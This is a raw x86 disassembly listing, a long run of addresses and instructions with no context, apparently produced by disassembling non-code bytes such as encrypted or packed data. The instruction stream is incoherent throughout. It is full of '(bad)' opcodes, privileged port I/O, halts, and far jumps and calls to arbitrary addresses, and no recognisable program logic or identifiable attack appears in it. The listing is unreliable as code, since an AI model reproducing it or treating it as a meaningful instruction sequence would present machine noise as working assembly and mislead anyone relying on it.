  402fcd:	out    dx,al
  402fce:	pop    ss
  402fcf:	cwde   
  402fd0:	in     eax,dx
  402fd1:	or     bh,dh
  402fd3:	in     al,dx
  402fd4:	push   ss
  402fd5:	push   ecx
  402fd6:	les    ecx,FWORD PTR [ebx-0x3f04a1c0]
  402fdc:	lea    ebp,[edx]
  402fde:	out    dx,eax
  402fdf:	or     DWORD PTR [esi+ecx*8-0x5bd0793f],eax
  402fe6:	add    DWORD PTR ds:0xd402c579,esi
  402fec:	in     al,0x6a
  402fee:	pop    ecx
  402fef:	out    dx,eax
  402ff0:	(bad)  
  402ff1:	mov    es,eax
  402ff3:	add    DWORD PTR [edx-0x783a17e5],0xe7a26be9
  402ffd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ffe:	imul   BYTE PTR [ecx+0x6ce03d75]
  403004:	aaa    
  403005:	scas   eax,DWORD PTR es:[edi]
  403006:	jmp    0xb636:0x89e1b74c
  40300d:	aaa    
  40300e:	jnp    0x402fff
  403010:	cs add eax,0x29e5f617
  403016:	in     al,0x60
  403018:	pop    ss
  403019:	jnp    0x403050
  40301b:	inc    ebp
  40301c:	std    
  40301d:	push   ebx
  40301e:	cmc    
  40301f:	mov    dh,0xf0
  403021:	pop    ebp
  403022:	jb     0x403039
  403024:	or     eax,0x4835960d
  403029:	div    DWORD PTR [edx-0x4e83ccca]
  40302f:	and    al,0x7a
  403031:	inc    ebp
  403032:	mov    esp,esi
  403034:	rol    DWORD PTR [edx],cl
  403036:	mov    ah,0x37
  403038:	scas   eax,DWORD PTR es:[edi]
  403039:	adc    edx,0x4cca32af
  40303f:	pop    edx
  403040:	or     cl,BYTE PTR ds:0x40b3d9cf
  403046:	or     dl,0x51
  403049:	aaa    
  40304a:	jge    0x403091
  40304c:	popa   
  40304d:	mov    eax,ss
  40304f:	shl    edx,1
  403051:	cli    
  403052:	adc    al,BYTE PTR cs:[esi-0x68]
  403056:	sti    
  403057:	push   ebp
  403058:	cmp    DWORD PTR [eax-0x73],esp
  40305b:	in     eax,0x97
  40305d:	jae    0x4030de
  40305f:	test   BYTE PTR [eax+0x5e],0x1f
  403063:	add    DWORD PTR [eax+0x4f],esp
  403066:	ds pop ss
  403068:	sub    bl,BYTE PTR [ecx-0x4b9fe879]
  40306e:	inc    edi
  40306f:	hlt    
  403070:	and    al,0xa6
  403072:	loop   0x4030e8
  403074:	mov    bh,al
  403076:	cmp    al,0x13
  403078:	mov    fs,esi
  40307a:	fild   DWORD PTR [eax]
  40307c:	std    
  40307d:	and    BYTE PTR [esi+0xbeb9bbd],0xcd
  403084:	push   ebx
  403085:	mov    edx,0xc1bb411e
  40308a:	push   ebx
  40308b:	xor    al,0x22
  40308d:	enter  0xa018,0x1e
  403091:	ins    DWORD PTR es:[edi],dx
  403092:	inc    edx
  403093:	dec    ecx
  403094:	aad    0x49
  403096:	push   ds
  403097:	or     cl,BYTE PTR [edi]
  403099:	(bad)  [ebx]
  40309b:	out    0x67,al
  40309d:	jne    0x4030e9
  40309f:	sbb    edx,eax
  4030a1:	inc    edx
  4030a2:	sub    al,0x55
  4030a4:	in     al,dx
  4030a5:	ins    DWORD PTR es:[edi],dx
  4030a6:	push   esp
  4030a7:	xor    al,0x9e
  4030a9:	mov    cs,WORD PTR [edi+0x38]
  4030ac:	shl    DWORD PTR [ecx+0x30],0x35
  4030b0:	sub    bh,al
  4030b2:	or     bl,BYTE PTR [esi+ecx*8+0x2c]
  4030b6:	mov    ah,0xb
  4030b8:	push   0x78
  4030ba:	push   esp
  4030bb:	test   eax,eax
  4030bd:	(bad)  
  4030be:	mov    ds:0x781afe07,al
  4030c3:	lods   al,BYTE PTR ds:[esi]
  4030c4:	repz pop esi
  4030c6:	ret    0x89a
  4030c9:	(bad)  
  4030ca:	mov    edi,0x4e3bb08b
  4030cf:	stos   DWORD PTR es:[edi],eax
  4030d0:	cmp    bl,cl
  4030d2:	(bad)  
  4030d3:	xor    al,0x47
  4030d5:	lahf   
  4030d6:	bnd je 0x403149
  4030d9:	mov    ch,0xae
  4030db:	test   eax,0x3ca0e11
  4030e0:	or     dh,dl
  4030e2:	add    DWORD PTR [esi-0x1a6f923e],esp
  4030e8:	jg     0x4030a3
  4030ea:	push   0xffffffd0
  4030ec:	push   ss
  4030ed:	sti    
  4030ee:	pop    ecx
  4030ef:	sub    DWORD PTR [ecx+0x5],0xe4e045a2
  4030f6:	inc    edx
  4030f7:	daa    
  4030f8:	mov    ch,0xdb
  4030fa:	test   al,0xd
  4030fc:	pop    ebx
  4030fd:	nop
  4030fe:	ins    DWORD PTR es:[edi],dx
  4030ff:	jno    0x4030e3
  403101:	je     0x40309d
  403103:	daa    
  403104:	pop    es
  403105:	hlt    
  403106:	aad    0x53
  403108:	repnz xlat BYTE PTR ds:[ebx]
  40310a:	pop    esp
  40310b:	clflush BYTE PTR [eax+0xbee8ce0]
  403112:	dec    edi
  403113:	cmc    
  403114:	cwde   
  403115:	nop
  403116:	dec    esi
  403117:	jo     0x403141
  403119:	xor    esi,esp
  40311b:	push   ebx
  40311c:	je     0x403109
  40311e:	xor    BYTE PTR [ebp+ebp*8-0x7a4c8a04],0x1b
  403126:	add    ah,0x7a
  403129:	dec    ebx
  40312a:	leave  
  40312b:	inc    eax
  40312c:	in     eax,0x7
  40312e:	retf   
  40312f:	inc    ecx
  403130:	or     DWORD PTR [ecx-0x23],eax
  403133:	mov    bh,0xf0
  403135:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403136:	push   edi
  403137:	mov    ah,0xb
  403139:	or     eax,DWORD PTR [edi-0x439512bd]
  40313f:	jnp    0x403148
  403141:	popa   
  403142:	xor    BYTE PTR [eax-0x7d],ch
  403145:	cmp    dh,BYTE PTR [ecx+eax*1]
  403148:	jb     0x403146
  40314a:	jp     0x40312c
  40314c:	lea    eax,[edi-0x7dfd1aea]
  403152:	mov    edi,0x80695099
  403157:	pushf  
  403158:	inc    ebp
  403159:	mov    ds:0xd7bcb0cb,eax
  40315e:	hlt    
  40315f:	paddsb mm6,QWORD PTR [ebx+0x4f513be8]
  403166:	add    al,0xbe
  403168:	push   esi
  403169:	sahf   
  40316a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40316b:	imul   eax,DWORD PTR [eax+0x38],0xffffffcc
  40316f:	sbb    al,0xc3
  403171:	imul   ebx,DWORD PTR [ebp+esi*2-0x3a789a43],0x4f61457d
  40317c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40317d:	rol    ah,1
  40317f:	inc    esp
  403180:	mov    ah,0x1b
  403182:	xchg   edx,eax
  403183:	inc    esi
  403184:	push   cs
  403185:	popf   
  403186:	or     eax,0x935a8dca
  40318b:	dec    ebx
  40318c:	cmp    DWORD PTR [eax-0x8e4ba78],ebx
  403192:	pop    edx
  403193:	or     bl,dl
  403195:	adc    eax,0xc23b45f0
  40319a:	jmp    0x40312d
  40319c:	aas    
  40319d:	das    
  40319e:	ds fdivr st,st(0)
  4031a1:	xor    esi,ecx
  4031a3:	mov    esp,DWORD PTR [edx-0x26]
  4031a6:	ss (bad) 
  4031a8:	shl    DWORD PTR [ecx-0xcee0fe],1
  4031ae:	dec    ebp
  4031af:	scas   eax,DWORD PTR es:[edi]
  4031b0:	ss pop edx
  4031b2:	add    eax,0x5e1e33fe
  4031b7:	jg     0x403148
  4031b9:	stos   BYTE PTR es:[edi],al
  4031ba:	cld    
  4031bb:	mov    bh,0xd9
  4031bd:	adc    eax,0x63fbb7ea
  4031c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031c3:	mov    ah,0x28
  4031c5:	jno    0x4031b0
  4031c7:	cs inc ebp
  4031c9:	idiv   DWORD PTR [ebp-0x23]
  4031cc:	icebp  
  4031cd:	retf   0xbf4d
  4031d0:	sbb    DWORD PTR ds:0x90d93d86,edx
  4031d6:	inc    eax
  4031d7:	sbb    DWORD PTR [eax-0xb],ebx
  4031da:	(bad)  
  4031db:	lods   eax,DWORD PTR ds:[esi]
  4031dc:	fcmovu st,st(6)
  4031de:	cwde   
  4031df:	sbb    cl,BYTE PTR [edx-0x6f09cef7]
  4031e5:	jmp    0xaf3bc56b
  4031ea:	sahf   
  4031eb:	inc    ecx
  4031ec:	jb     0x4031bb
  4031ee:	xchg   ecx,esi
  4031f0:	out    dx,al
  4031f1:	push   ebx
  4031f2:	add    al,0xc4
  4031f4:	push   esi
  4031f5:	call   0x65ef293
  4031fa:	mov    dl,0x7f
  4031fc:	cmp    al,0x35
  4031fe:	lahf   
  4031ff:	shl    al,1
  403201:	retf   0xf6ad
  403204:	inc    esi
  403205:	jnp    0x403215
  403207:	and    al,0x3d
  403209:	fs mov eax,0x59466216
  40320f:	and    edx,DWORD PTR [ecx]
  403211:	fnstcw WORD PTR [ebp-0x12708918]
  403217:	js     0x4031a8
  403219:	or     eax,esp
  40321b:	mov    al,0x85
  40321d:	aas    
  40321e:	shl    DWORD PTR [ecx+ebp*1],0x7b
  403222:	adc    eax,0x261c363
  403227:	jmp    0x403252
  403229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40322a:	push   edx
  40322b:	fcomp  DWORD PTR [edx+0x68]
  40322e:	jae    0x4031c6
  403230:	sub    al,0x2b
  403232:	or     al,0xc0
  403234:	jo     0x4031f0
  403236:	call   0xa50c:0x67cf6fad
  40323d:	iret   
  40323e:	addr16 pop esp
  403240:	adc    al,BYTE PTR [ebx+0x4110a2c6]
  403246:	sbb    dl,ah
  403248:	fcom   QWORD PTR [edi+0x42734e49]
  40324e:	les    edi,FWORD PTR [ebp+0x2abe6bee]
  403254:	and    DWORD PTR [ebx-0x2639387d],esi
  40325a:	cmp    DWORD PTR [ebp-0x3b33ff65],ebx
  403260:	adc    esp,DWORD PTR fs:[ecx+0x32f9e6e1]
  403267:	mov    ah,0xc8
  403269:	out    dx,al
  40326a:	fadd   QWORD PTR ds:0x6e7b5906
  403270:	xchg   ebp,eax
  403271:	pusha  
  403272:	adc    edx,edi
  403274:	cdq    
  403275:	xlat   BYTE PTR ds:[ebx]
  403276:	shr    BYTE PTR [eax-0x59],0x7f
  40327a:	fs daa 
  40327c:	adc    BYTE PTR [ebx-0x11],ah
  40327f:	rol    eax,cl
  403281:	xor    al,0xd8
  403283:	retf   
  403284:	cli    
  403285:	sub    al,0xf7
  403287:	ds mov ecx,0x85ea9b51
  40328d:	fs add eax,0xb3451fb5
  403293:	sti    
  403294:	jne    0x403216
  403296:	shl    BYTE PTR fs:[esi],1
  403299:	inc    esi
  40329a:	(bad)  
  40329b:	fucomip st,st(2)
  40329d:	xchg   ebp,esp
  40329f:	sub    DWORD PTR [esp+ebx*8+0x3707090c],esi
  4032a6:	scas   al,BYTE PTR es:[edi]
  4032a7:	xor    al,0x5d
  4032a9:	jle    0x40331f
  4032ab:	imul   ecx,DWORD PTR [edx+0x41],0x9b956304
  4032b2:	inc    ebp
  4032b3:	stc    
  4032b4:	sahf   
  4032b5:	xchg   edx,eax
  4032b6:	(bad)  
  4032b7:	fmul   QWORD PTR [ebp+0x183dd46a]
  4032bd:	ss mov bl,0x14
  4032c0:	ret    0xf715
  4032c3:	pop    esp
  4032c4:	jmp    0xb87773a8
  4032c9:	push   ecx
  4032ca:	and    cl,BYTE PTR ds:0x7cdbc34
  4032d0:	xor    ch,BYTE PTR [esi]
  4032d2:	cmp    eax,0x54deaf47
  4032d7:	inc    ecx
  4032d8:	sub    esp,eax
  4032da:	test   DWORD PTR [ecx-0x521badb7],ecx
  4032e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032e1:	or     eax,0x2e68d67f
  4032e6:	pop    esp
  4032e7:	jecxz  0x40331c
  4032e9:	repnz pop esi
  4032eb:	inc    ecx
  4032ec:	mov    ds:0x2f8cbab2,eax
  4032f1:	aaa    
  4032f2:	add    edi,ecx
  4032f4:	cdq    
  4032f5:	adc    al,0xf1
  4032f7:	jbe    0x403303
  4032f9:	jge    0x403371
  4032fb:	or     DWORD PTR [edi],esi
  4032fd:	lods   al,BYTE PTR ds:[esi]
  4032fe:	ins    BYTE PTR es:[edi],dx
  4032ff:	xchg   edx,eax
  403300:	xlat   BYTE PTR ds:[ebx]
  403301:	fdivr  QWORD PTR [esi+0x1f77300f]
  403307:	nop
  403308:	leave  
  403309:	mov    bl,0xd8
  40330b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40330c:	mov    dh,0x5e
  40330e:	(bad)  
  403310:	clc    
  403311:	push   ecx
  403312:	popf   
  403313:	cwde   
  403314:	out    dx,eax
  403315:	mov    ebx,0x35a29b93
  40331a:	call   0x8b3988c6
  40331f:	mov    dh,0x46
  403321:	sub    BYTE PTR ds:0x216c422,bh
  403327:	mov    ds:0x1ba25643,al
  40332c:	jo     0x40330f
  40332e:	lods   eax,DWORD PTR ds:[esi]
  40332f:	cmp    DWORD PTR [eax],edx
  403331:	xor    DWORD PTR [esi+0x50],edx
  403334:	call   0x62:0xf939893e
  40333b:	mov    fs,edi
  40333d:	jb     0x4032ed
  40333f:	xchg   ecx,eax
  403340:	daa    
  403341:	jmp    0x6a6ceab9
  403346:	icebp  
  403347:	xor    dl,dh
  403349:	inc    ecx
  40334a:	(bad)  
  40334b:	jle    0x4032db
  40334d:	or     DWORD PTR [eax-0x7149797a],esp
  403353:	inc    eax
  403354:	nop
  403355:	adc    DWORD PTR [edx+ecx*4-0x7df75ea0],0x51534ecd
  403360:	jl     0x4033b9
  403362:	push   ebx
  403363:	imul   BYTE PTR [edi+0x326417a1]
  403369:	in     eax,0xbe
  40336b:	inc    esp
  40336c:	fistp  DWORD PTR [ecx]
  40336e:	sub    edx,DWORD PTR [edi+0x2c]
  403371:	push   eax
  403372:	cld    
  403373:	aad    0xa1
  403375:	cld    
  403376:	cmp    eax,0x58f190b6
  40337b:	jo     0x403355
  40337d:	push   edi
  40337e:	test   al,0xe9
  403380:	jmpw   0x2b36
  403384:	push   ecx
  403385:	inc    esp
  403386:	or     BYTE PTR [ecx],bl
  403388:	mov    al,ds:0xdb9f5015
  40338d:	jp     0x4033f3
  40338f:	shl    DWORD PTR [ebx],0x10
  403392:	das    
  403393:	jbe    0x4033c4
  403395:	fwait
  403396:	add    eax,0x90781eaa
  40339b:	mov    eax,ds:0x8981142e
  4033a0:	push   cs
  4033a1:	int3   
  4033a2:	mov    al,ds:0xa2d43c6e
  4033a7:	push   esi
  4033a8:	dec    esp
  4033a9:	or     eax,0xd9b9920f
  4033ae:	xchg   edi,eax
  4033af:	lahf   
  4033b0:	adc    ebx,DWORD PTR [ecx-0xe]
  4033b3:	sub    DWORD PTR [eax-0x65],ebp
  4033b6:	arpl   WORD PTR [esi],bp
  4033b8:	and    BYTE PTR [ebx+0x48],bh
  4033bb:	mov    ebp,0xd7aff74e
  4033c0:	std    
  4033c1:	mov    ds:0xa255774c,al
  4033c6:	xor    eax,0x98d771fc
  4033cb:	push   ds
  4033cc:	lods   eax,DWORD PTR ds:[esi]
  4033cd:	xchg   ecx,eax
  4033ce:	cmp    BYTE PTR [ebp+0x7f],bl
  4033d1:	cmp    eax,DWORD PTR [eax]
  4033d3:	and    eax,0x4e9a1862
  4033d8:	ja     0x4033a1
  4033da:	rol    BYTE PTR [ebx+0x37c0675],0x30
  4033e1:	sub    DWORD PTR ds:0xf4c23dc0,edx
  4033e7:	repnz rol ebp,1
  4033ea:	sahf   
  4033eb:	scas   al,BYTE PTR es:[edi]
  4033ec:	into   
  4033ed:	xor    eax,0x69daa85
  4033f2:	or     BYTE PTR ds:0x155e412b,dl
  4033f8:	fs ret 
  4033fa:	jg     0x403388
  4033fc:	int3   
  4033fd:	ret    
  4033fe:	jmp    0x3d871ec6
  403403:	dec    edi
  403404:	call   0x19d2:0x2e1e6dcf
  40340b:	push   0xdf0ec0ed
  403410:	xchg   esp,eax
  403411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403412:	jo     0x403483
  403414:	in     eax,0xb8
  403416:	jo     0x4033e3
  403418:	sbb    ecx,DWORD PTR [edi]
  40341a:	mov    ecx,0x8a165b28
  40341f:	push   eax
  403420:	mov    bh,0x3b
  403422:	sbb    BYTE PTR [esi+0x72],ah
  403425:	push   edi
  403426:	jo     0x40341e
  403428:	sahf   
  403429:	dec    ebp
  40342a:	add    DWORD PTR [ecx],ebp
  40342c:	push   0x683e4315
  403431:	int3   
  403432:	adc    DWORD PTR [ecx+0x0],ebx
  403435:	sub    BYTE PTR [ebp+edi*2+0x78284ead],dh
  40343c:	das    
  40343d:	mov    eax,0xe1487808
  403442:	push   0x9f86bc73
  403447:	push   ecx
  403448:	(bad)  
  403449:	into   
  40344a:	mov    esi,0x543bcf55
  40344f:	cli    
  403450:	mov    ebx,0x7cedb1c2
  403455:	cmp    eax,0x3e36ea5e
  40345a:	in     al,0x62
  40345c:	in     al,dx
  40345d:	jp     0x40347d
  40345f:	shl    DWORD PTR [ebx],1
  403461:	add    al,0x47
  403463:	xchg   esp,eax
  403464:	fwait
  403465:	add    eax,0x83db5c60
  40346a:	popf   
  40346b:	jns    0x403450
  40346d:	lahf   
  40346e:	jmp    DWORD PTR ds:0x2489d99e
  403474:	sub    cl,BYTE PTR [ebp+0x4b]
  403477:	in     al,dx
  403478:	fcmovb st,st(4)
  40347a:	pushf  
  40347b:	xchg   edx,eax
  40347c:	dec    ebx
  40347d:	mov    ch,BYTE PTR [eax+ebx*8]
  403480:	popf   
  403481:	sti    
  403482:	inc    eax
  403483:	adc    al,0xec
  403485:	sbb    cl,BYTE PTR [edi]
  403487:	not    al
  403489:	dec    esi
  40348a:	jo     0x40346b
  40348c:	xchg   edi,eax
  40348d:	jecxz  0x403472
  40348f:	lods   al,BYTE PTR ds:[esi]
  403490:	div    BYTE PTR [ecx+0xa]
  403493:	sub    BYTE PTR [eax+0x3d],0xf8
  403497:	pop    ecx
  403498:	dec    ebx
  403499:	shl    BYTE PTR [ebx+ebp*2],cl
  40349c:	mov    bl,0x6
  40349e:	cdq    
  40349f:	test   DWORD PTR [eax+0x20],edi
  4034a2:	shr    BYTE PTR [edx],0x88
  4034a5:	push   cs
  4034a6:	jecxz  0x403456
  4034a8:	inc    esp
  4034a9:	dec    esp
  4034aa:	mov    ebp,0x4005691f
  4034af:	gs push eax
  4034b1:	lods   al,BYTE PTR ds:[esi]
  4034b2:	and    ah,BYTE PTR [esi-0x53ebbb47]
  4034b8:	cmp    edx,DWORD PTR [eax-0x253e1ac2]
  4034be:	push   cs
  4034bf:	dec    esi
  4034c0:	shl    BYTE PTR [ebx],0x61
  4034c3:	xchg   esp,eax
  4034c4:	pop    edi
  4034c5:	jge    0x4034f6
  4034c7:	push   cs
  4034c8:	and    DWORD PTR [ebx+0x6a],ecx
  4034cb:	jg     0x403485
  4034cd:	dec    eax
  4034ce:	loopne 0x4034a7
  4034d0:	push   ecx
  4034d1:	scas   al,BYTE PTR es:[edi]
  4034d2:	add    ebp,DWORD PTR [eax-0x39e9e282]
  4034d8:	xor    DWORD PTR cs:[edi-0x2e27f924],esi
  4034df:	adc    al,0xe5
  4034e1:	arpl   WORD PTR [ecx+0x2f],di
  4034e4:	mov    ebx,0x3c780363
  4034e9:	adc    al,0xfa
  4034ec:	mov    bh,BYTE PTR [edx-0x73]
  4034ef:	lea    edi,[eax+0x40]
  4034f2:	xor    DWORD PTR [ecx-0x13],ecx
  4034f5:	xchg   ebp,eax
  4034f6:	into   
  4034f7:	inc    ecx
  4034f8:	lds    ebx,FWORD PTR [ebp+ecx*8-0x12b206a8]
  4034ff:	fnstenv [esi+0x6e]
  403502:	jmp    0x6725:0x41a677f3
  403509:	mov    WORD PTR [ebp+0x3745d52d],fs
  40350f:	mov    WORD PTR [esi-0x76916802],cs
  403515:	or     ecx,ecx
  403517:	sbb    eax,0xefc7f440
  40351c:	retf   
  40351d:	mov    ch,0x57
  40351f:	shl    edx,1
  403521:	jge    0x4034f7
  403523:	cmp    al,0x39
  403525:	mov    dh,0xda
  403527:	lock adc BYTE PTR [eax-0x5f9f95da],0x51
  40352f:	cmc    
  403530:	jo     0x403512
  403532:	jle    0x40358e
  403534:	pusha  
  403535:	pop    ebp
  403536:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403537:	sti    
  403538:	mov    bh,0x19
  40353a:	mov    dl,0xa5
  40353c:	sub    BYTE PTR [ecx],0x17
  40353f:	or     esi,DWORD PTR [ecx]
  403541:	shr    DWORD PTR [ebp-0x275d30f5],cl
  403547:	in     al,0x7c
  403549:	mov    ah,0x14
  40354b:	test   esp,0xe5bd502c
  403551:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403552:	popa   
  403553:	dec    eax
  403554:	inc    ebx
  403555:	shl    edi,cl
  403557:	and    bl,BYTE PTR [eax+0x4d30474a]
  40355d:	shr    DWORD PTR [esi-0x743b2068],cl
  403563:	sbb    BYTE PTR [eax+0x53a2b67a],bh
  403569:	xchg   edx,eax
  40356a:	jno    0xb9ab9074
  403570:	int    0xc2
  403572:	pop    ds
  403573:	aam    0xb3
  403575:	or     DWORD PTR [esi],ebx
  403577:	add    ebp,ecx
  403579:	pop    ss
  40357a:	out    dx,al
  40357b:	je     0x40356c
  40357d:	ret    
  40357e:	xor    dl,cl
  403580:	(bad)  
  403582:	inc    ecx
  403583:	and    eax,0x13b38c3a
  403588:	push   edi
  403589:	and    eax,0x31653f82
  40358e:	inc    ebx
  40358f:	imul   esi,ecx,0x9421ba0e
  403595:	mov    ebp,0x43bdae42
  40359a:	dec    edi
  40359b:	dec    esp
  40359c:	sti    
  40359d:	push   ecx
  40359e:	add    eax,DWORD PTR [edi-0x2]
  4035a1:	xor    al,0x79
  4035a3:	sahf   
  4035a4:	into   
  4035a5:	pushf  
  4035a6:	sub    bh,BYTE PTR [ecx+eax*2]
  4035a9:	test   ebx,ebp
  4035ab:	sbb    DWORD PTR [edx+ebx*2+0x1d397d45],eax
  4035b2:	push   esp
  4035b3:	or     eax,0x32bb161a
  4035b8:	pusha  
  4035b9:	xchg   eax,edi
  4035bb:	mov    ?,WORD PTR [edi-0x1b]
  4035be:	jp     0x4035ee
  4035c0:	push   esp
  4035c1:	mov    al,ds:0xed2cfefd
  4035c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035c7:	mov    edi,0x6123a5e3
  4035cc:	and    DWORD PTR [ebx+0x62],ebp
  4035cf:	es push ebx
  4035d1:	adc    eax,0xc06c9b30
  4035d6:	or     ecx,eax
  4035d8:	xlat   BYTE PTR ds:[ebx]
  4035d9:	sbb    DWORD PTR [ebx+0x9c6af40],0x5844c05d
  4035e3:	inc    eax
  4035e4:	das    
  4035e5:	sub    BYTE PTR [edi+0x55eab42a],bl
  4035eb:	hlt    
  4035ec:	cmp    DWORD PTR [esi-0xf57a087],edx
  4035f2:	(bad)  
  4035f4:	retf   0xc863
  4035f7:	inc    ebp
  4035f8:	mov    BYTE PTR [eax],bh
  4035fa:	test   BYTE PTR [eax-0x46f1f0e1],cl
  403600:	lods   eax,DWORD PTR ds:[esi]
  403601:	and    DWORD PTR [ebx-0x2],ecx
  403604:	nop
  403605:	mov    esp,0x6a612ab6
  40360a:	mov    edi,DWORD PTR ds:0x4745b1e5
  403610:	ror    BYTE PTR [edx-0x314f97ad],cl
  403616:	clc    
  403617:	fist   WORD PTR [ecx+0x71f2dc5c]
  40361d:	sub    ah,BYTE PTR [eax-0xd58a37f]
  403623:	loop   0x40361c
  403625:	sbb    DWORD PTR [eax-0x1d330571],edi
  40362b:	pop    ss
  40362c:	jbe    0x403646
  40362e:	inc    eax
  40362f:	xor    ecx,DWORD PTR [ebp-0x30]
  403632:	popf   
  403633:	test   BYTE PTR [edx+0x17f55835],al
  403639:	lds    ecx,FWORD PTR [edi]
  40363b:	xchg   edx,eax
  40363c:	test   al,0x9e
  40363e:	stc    
  40363f:	xchg   esi,esi
  403641:	pop    edx
  403642:	xor    ecx,edi
  403644:	mov    esp,0x3ad2194
  403649:	push   ss
  40364a:	and    BYTE PTR [eax+0x205af85a],ch
  403650:	scas   eax,DWORD PTR es:[edi]
  403651:	add    eax,0x7f90f5e
  403656:	mov    al,ds:0xb3aee295
  40365b:	repnz (bad) 
  40365d:	iret   
  40365e:	cmp    eax,0xf279bf5a
  403663:	test   DWORD PTR [ecx-0x10],eax
  403666:	push   cs
  403667:	cs daa 
  403669:	js     0x403695
  40366b:	ins    DWORD PTR es:[edi],dx
  40366c:	pop    edx
  40366d:	pop    ecx
  40366e:	dec    ebp
  40366f:	sbb    ah,cl
  403671:	std    
  403672:	inc    edx
  403673:	dec    esp
  403674:	(bad)  
  403675:	iret   
  403676:	adc    BYTE PTR [edi],bh
  403678:	push   es
  403679:	mov    edx,0x79e48d96
  40367e:	pusha  
  40367f:	dec    ecx
  403680:	dec    edi
  403681:	jb     0x40368b
  403683:	sub    eax,0x4c3a73af
  403688:	cmp    eax,0x3713d36b
  40368d:	xchg   BYTE PTR [edi-0x32],ah
  403690:	retf   0x4237
  403693:	pop    edi
  403694:	mov    edx,0xb0fc157e
  403699:	adc    ebx,edi
  40369b:	scas   al,BYTE PTR es:[edi]
  40369c:	es adc ebx,edi
  40369f:	jo     0x403719
  4036a1:	test   DWORD PTR cs:[ebx-0xf74a712],esi
  4036a8:	div    BYTE PTR [ebp+0x47]
  4036ab:	out    0x88,al
  4036ad:	inc    ebp
  4036ae:	adc    eax,ebx
  4036b0:	or     esp,esp
  4036b2:	mov    ch,0x32
  4036b4:	mov    dl,0xc5
  4036b6:	cli    
  4036b7:	dec    edi
  4036b8:	aad    0x2a
  4036ba:	iret   
  4036bb:	mov    DWORD PTR [eax],ebp
  4036bd:	fidiv  WORD PTR [edx-0x7fe0973a]
  4036c3:	lds    ecx,FWORD PTR [eax-0x69]
  4036c6:	xchg   edx,eax
  4036c7:	cmp    ebx,ebp
  4036c9:	push   es
  4036ca:	mov    DWORD PTR [esi*2+0x5cdb61dd],ecx
  4036d1:	add    bl,BYTE PTR [esi]
  4036d3:	bswap  esp
  4036d5:	repz scas al,BYTE PTR es:[edi]
  4036d7:	js     0x403702
  4036d9:	ins    BYTE PTR es:[edi],dx
  4036da:	and    bh,BYTE PTR [ebp+ebp*8-0x19]
  4036de:	(bad)  
  4036df:	mov    ebx,0x38bd4547
  4036e4:	push   eax
  4036e5:	pop    ecx
  4036e6:	fadd   DWORD PTR [ebx+0x61]
  4036e9:	mov    ah,0x13
  4036eb:	add    esi,DWORD PTR [ebp-0x21417468]
  4036f1:	das    
  4036f2:	inc    eax
  4036f3:	outs   dx,DWORD PTR ds:[esi]
  4036f4:	xchg   edi,eax
  4036f5:	jno    0x4036b1
  4036f7:	cmp    eax,0x4898fcf3
  4036fc:	push   eax
  4036fd:	imul   ebp,DWORD PTR [eax],0xffffffcf
  403700:	fsubr  QWORD PTR [eax-0x3f3d7703]
  403706:	arpl   WORD PTR [ebx+0x68],dx
  403709:	mov    dl,0xba
  40370b:	jae    0x40375a
  40370d:	adc    ebx,DWORD PTR [ebp-0x5228c2d8]
  403713:	daa    
  403714:	mov    ebp,0xb8d17c00
  403719:	leave  
  40371a:	dec    ebx
  40371b:	stc    
  40371c:	addr16 aam 0x6f
  40371f:	push   ss
  403720:	cmp    BYTE PTR [ebx-0x57efa7f6],0x82
  403727:	(bad)  
  403729:	push   0xc6743c8d
  40372e:	in     eax,dx
  40372f:	mov    ds:0xd0d7514f,eax
  403734:	fs and eax,0x11610b02
  40373a:	mov    al,0x5e
  40373c:	push   ebx
  40373d:	sub    ch,BYTE PTR [edx+0x25]
  403740:	es int3 
  403742:	ret    0xa925
  403745:	mov    ss,WORD PTR [ecx-0x3a]
  403748:	addr16 inc esi
  40374a:	and    al,dh
  40374c:	das    
  40374d:	dec    esp
  40374e:	dec    esi
  40374f:	fcom   DWORD PTR [edi]
  403751:	fs repz push esp
  403754:	enter  0x7821,0x84
  403758:	push   ds
  403759:	pop    ecx
  40375a:	pushf  
  40375b:	out    0xf5,al
  40375d:	lock jo 0x40374e
  403760:	loop   0x403785
  403762:	pop    edx
  403763:	sub    ecx,ecx
  403765:	mov    WORD PTR ds:[esi],cs
  403768:	scas   eax,DWORD PTR es:[edi]
  403769:	mov    bl,0x9
  40376b:	loope  0x4037ad
  40376d:	xlat   BYTE PTR ds:[ebx]
  40376e:	push   0xffffff95
  403770:	out    0xb1,eax
  403772:	outs   dx,DWORD PTR ds:[esi]
  403773:	dec    esi
  403774:	bound  edx,QWORD PTR [ebx]
  403776:	dec    eax
  403777:	(bad)  
  403778:	cdq    
  403779:	mov    BYTE PTR [ebx+edi*2],al
  40377c:	adc    bh,BYTE PTR [eax+0x15]
  40377f:	nop
  403780:	xchg   edx,eax
  403781:	retf   
  403782:	xchg   edx,eax
  403783:	push   ebx
  403784:	sbb    ecx,DWORD PTR [ebp+0x5df59335]
  40378a:	push   ds
  40378b:	ss hlt 
  40378d:	fidiv  DWORD PTR [ebx]
  40378f:	pop    ds
  403790:	mov    al,0x3b
  403792:	in     al,0xb6
  403794:	add    cl,dh
  403796:	mov    ch,0x23
  403798:	fwait
  403799:	mov    al,0xf2
  40379b:	out    0x4d,al
  40379d:	cmp    al,0xfc
  40379f:	mov    ah,0x96
  4037a1:	ror    DWORD PTR [ebx+0x1e],0xc4
  4037a5:	out    dx,eax
  4037a6:	aaa    
  4037a7:	fimul  DWORD PTR [ecx+0x3d68c9ea]
  4037ad:	or     DWORD PTR [ecx-0xaed5450],0x6f
  4037b4:	cmp    BYTE PTR [esi-0x4c792f70],cl
  4037ba:	outs   dx,BYTE PTR ds:[esi]
  4037bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037bc:	daa    
  4037bd:	clc    
